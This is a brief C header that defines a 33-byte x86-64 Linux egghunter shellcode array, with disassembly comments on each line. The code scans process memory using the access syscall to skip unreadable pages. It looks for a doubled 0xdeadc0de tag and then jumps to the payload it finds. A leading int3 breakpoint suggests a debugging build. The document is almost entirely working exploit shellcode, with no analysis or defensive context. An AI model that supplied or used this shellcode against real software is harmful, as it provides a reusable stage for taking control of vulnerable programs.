
#define EGG_SIZE 33

char EGG[] = {
  /* 0000 */ "\xcc"                 /* int3                */
  /* 0001 */ "\x31\xff"             /* xor edi, edi        */
  /* 0003 */ "\xf7\xe7"             /* mul edi             */
  /* 0005 */ "\x96"                 /* xchg esi, eax       */
  /* 0006 */ "\xb6\x10"             /* mov dh, 0x10        */
  /* 0008 */ "\x48\x01\xd7"         /* add rdi, rdx        */
  /* 000B */ "\x6a\x15"             /* push 0x15           */
  /* 000D */ "\x58"                 /* pop rax             */
  /* 000E */ "\x0f\x05"             /* syscall             */
  /* 0010 */ "\x85\xc0"             /* test eax, eax       */
  /* 0012 */ "\x75\xf4"             /* jnz 0x8             */
  /* 0014 */ "\xb8\xde\xc0\xad\xde" /* mov eax, 0xdeadc0de */
  /* 0019 */ "\xaf"                 /* scasd               */
  /* 001A */ "\x75\xef"             /* jnz 0xb             */
  /* 001C */ "\xaf"                 /* scasd               */
  /* 001D */ "\x75\xec"             /* jnz 0xb             */
  /* 001F */ "\xff\xe7"             /* jmp rdi             */
};